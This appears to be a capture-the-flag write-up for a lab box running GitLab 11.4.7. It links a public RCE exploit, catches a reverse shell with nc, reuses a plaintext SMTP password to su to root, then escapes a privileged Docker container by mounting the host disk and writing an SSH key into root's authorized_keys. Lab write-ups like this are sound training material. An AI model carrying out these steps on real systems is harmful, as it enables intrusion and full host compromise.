```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.129.227.132:5080/users/sign_in
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
gitlab on port 5080, with version of 11.4.7, after register an account, view the version

https://github.com/mohinparamasivam/GitLab-11.4.7-Authenticated-Remote-Code-Execution/blob/main/gitlab_rce.py
```
└─$ nc -nvlp 443 
listening on [any] 443 ...
connect to [10.10.16.47] from (UNKNOWN) [10.129.227.132] 47914
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```
//get user

//search in the gitlab dir, found a passwd, try to su to root
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"

```
su 
root@gitlab:/# ls -la
ls -la
total 100
drwxr-xr-x   1 root root 4096 Apr  5  2022 .
drwxr-xr-x   1 root root 4096 Apr  5  2022 ..
-rwxr-xr-x   1 root root    0 Apr  5  2022 .dockerenv
-rw-r--r--   1 root root  185 Nov 20  2018 RELEASE
drwxr-xr-x   2 root root 4096 Apr  5  2022 assets
drwxr-xr-x   1 root root 4096 Apr  5  2022 bin
drwxr-xr-x   2 root root 4096 Apr  5  2022 boot
drwxr-xr-x  13 root root 3760 Dec 24 13:44 dev
```

the .dockerenv folder indicates we are in a container.
show the disk

`root@gitlab:/# lsblk`
```
lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop1    7:1    0 71.3M  1 loop 
loop4    7:4    0 55.5M  1 loop 
loop2    7:2    0 31.1M  1 loop 
loop0    7:0    0 55.4M  1 loop 
sda      8:0    0   10G  0 disk 
|-sda2   8:2    0  9.5G  0 part /mnt
|-sda3   8:3    0  512M  0 part [SWAP]
`-sda1   8:1    0    1M  0 part 
loop5    7:5    0 31.1M  1 loop 
loop3    7:3    0 71.4M  1 loop 
```
The docker-compose.yml file defines the container config
```
version: '2.4'
services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    *privileged: true
    restart: unless-stopped
    #mem_limit: 1024m
```

privileged: true, means root of container has root privi to the host
mount to whole disk to container disk
```
ssh-keygen -f /mnt/root/.ssh/id_rsa -P ""
cp /mnt/root/.ssh/id_rsa.pub /mnt/root/.ssh/authorized_keys
cat /mnt/root/.ssh/id_rsa
```
copy the private key to our attack machine, ssh as root to escape from container
ssh -i id_rsa root@xxx

#### lesson learned
- container compose.yml with privi root, has root porivi to host. mount the whole disk to container, to wrote pub key for ssh
